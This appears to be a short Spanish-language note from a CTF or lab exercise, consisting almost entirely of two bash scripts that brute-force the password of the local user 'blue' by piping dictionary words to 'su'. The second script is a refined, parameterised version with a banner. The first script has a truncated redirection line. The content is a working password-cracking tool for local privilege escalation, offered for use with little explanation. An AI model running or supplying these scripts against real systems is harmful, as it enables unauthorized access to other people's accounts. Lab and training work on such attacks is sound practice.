Podemos hacer un ataque de fuerza bruta al usuario sudo ejecutando el siguiente script:
```bash
#!/bin/bash

archivo="diccionario.txt"
usuario="blue"

function finish {
    echo "Finalizando el script"
    exit
}

trap finish SIGINT

while IFS= read -r password; do
    echo "Probando contraseña: $password"
    if timeout 0.1 bash -c "echo $password | su $usuario -c 'echo Hello'" > /de>
        echo "Contraseña encontrada: $password"
        break
    fi
done < "$archivo"
```
![[Pasted image 20231122110206.png]]
Mejoramos el script:
```bash
#!/bin/bash

mostrar_ayuda() {
    echo -e "\e[1;33mUso: $0 USUARIO DICCIONARIO"
    echo -e "\e[1;31mSe deben especificar tanto el nombre de usuario como el archivo de diccionario.\e[0m"
    exit 1
}

imprimir_banner() {
    echo -e "\e[1;34m"  # Cambiar el texto a color azul brillante
    echo "******************************"
    echo "*     BruteForce SU         *"
    echo "******************************"
    echo -e "\e[0m"  # Restablecer los colores a los valores predeterminados
}

finalizar() {
    echo -e "\e[1;31m\nFinalizando el script\e[0m"
    exit
}

trap finalizar SIGINT

usuario=$1
diccionario=$2

# Procesar los parámetros de línea de comandos
if [[ $# != 2 ]]; then
    mostrar_ayuda
fi

# Verificar si se proporcionaron todos los parámetros necesarios
imprimir_banner

while IFS= read -r password; do
    echo "Probando contraseña: $password"
    if timeout 0.1 bash -c "echo $password | su $usuario -c 'echo Hello'" > /dev/null; then
        clear
        echo -e "\e[1;32mContraseña encontrada para el usuario $usuario: $password\e[0m"
        break
    fi
done < "$diccionario"
```
![[Pasted image 20231122112706.png]]
![[Pasted image 20231122112727.png]]
